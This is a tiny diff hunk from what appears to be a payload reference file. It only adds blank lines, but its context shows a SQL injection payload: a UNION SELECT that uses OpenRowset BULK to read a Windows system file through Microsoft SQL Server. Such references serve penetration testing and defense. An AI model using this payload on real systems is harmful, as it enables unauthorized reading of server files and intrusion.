@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:42.036386+00:00'
 ```sql
 -1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null
 ```
+
+
